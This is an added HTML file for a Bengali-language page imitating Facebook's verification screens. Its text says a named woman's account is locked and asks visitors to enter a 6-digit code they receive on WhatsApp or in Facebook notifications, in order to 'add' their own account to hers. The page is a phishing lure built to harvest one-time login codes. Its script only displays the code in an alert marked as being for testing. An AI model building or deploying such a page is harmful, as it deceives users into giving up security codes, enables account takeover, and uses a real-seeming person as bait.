@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verification</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      color: #1c1e21;
+    }
+    .container {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 24px;
+      text-align: center;
+    }
+    .back {
+      display: block;
+      text-align: left;
+      color: #1877f2;
+      font-size: 16px;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+    .back:hover { text-decoration: underline; }
+    .shield {
+      font-size: 80px;
+      margin: 0 auto 20px;
+      color: #1877f2;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+    .text {
+      font-size: 15px;
+      line-height: 1.5;
+      color: #606770;
+      margin-bottom: 32px;
+      text-align: left;
+    }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 32px;
+    }
+    .code-box {
+      width: 50px;
+      height: 60px;
+      border: 2px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 36px;
+      font-weight: bold;
+      text-align: center;
+      transition: border-color 0.2s;
+      background: white;
+    }
+    .code-box:focus {
+      border-color: #1877f2;
+      outline: none;
+    }
+    .code-box.filled {
+      border-color: #1877f2;
+    }
+    button {
+      background: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      width: 100%;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover { background: #166fe5; }
+    button:disabled {
+      background: #a0c4ff;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <a href="#" class="back">← Verification</a>
+
+    <div class="shield">🔰</div> <!-- বড় নীল শিল্ড (emoji); চাইলে SVG/PNG দিয়ে রিপ্লেস করো -->
+
+    <h1>৬-সংখ্যার অ্যাড কোড নম্বর দিন</h1>
+
+    <div class="text">
+      Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে লক করা আছে। তার ফেসবুকের সাথে আপনার ফেসবুক অ্যাড করতে চাইলে দেখুন আপনার হোয়াটসঅ্যাপে অথবা ফেসবুক নোটিফিকেশনে ৬ সংখ্যার কোড পাবেন। সেখান থেকে কোডটি এনে এখানে বসিয়ে আপনার ফেসবুকের সাথে অ্যাড করুন।
+      
+      Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে লক করা আছে। তার ফেসবুকের সাথে আপনার ফেসবুক অ্যাড করতে চাইলে দেখুন আপনার হোয়াটসঅ্যাপে অথবা ফেসবুক নোটিফিকেশনে ৬ সংখ্যার কোড পাবেন। সেখান থেকে কোডটি এনে এখানে বসিয়ে আপনার ফেসবুকের সাথে অ্যাড করুন।
+    </div>
+
+    <div class="code-inputs">
+      <input type="text" maxlength="1" class="code-box" autofocus />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+    </div>
+
+    <button id="submitBtn" disabled>অ্যাড করুন</button>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', e => {
+        const val = e.target.value.trim();
+        if (val && val.length === 1 && /\d/.test(val)) {
+          input.classList.add('filled');
+          if (idx < inputs.length - 1) inputs[idx + 1].focus();
+        } else {
+          input.classList.remove('filled');
+          input.value = '';
+        }
+        toggleButton();
+      });
+
+      input.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', e => {
+        e.preventDefault();
+        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+        text.split('').forEach((char, i) => {
+          if (idx + i < inputs.length) {
+            inputs[idx + i].value = char;
+            inputs[idx + i].classList.add('filled');
+          }
+        });
+        const next = Array.from(inputs).findIndex(el => !el.value);
+        if (next !== -1) inputs[next].focus();
+        else inputs[inputs.length - 1].focus();
+        toggleButton();
+      });
+    });
+
+    function toggleButton() {
+      const filled = Array.from(inputs).every(el => el.value.length === 1);
+      submitBtn.disabled = !filled;
+    }
+
+    submitBtn.addEventListener('click', () => {
+      const code = Array.from(inputs).map(el => el.value).join('');
+      alert('কোড: ' + code + '\n(শুধু টেস্ট/শেখার জন্য)');
+      // এখানে চাইলে inputs ক্লিয়ার করতে পারো
+    });
+  </script>
+
+</body>
+</html>
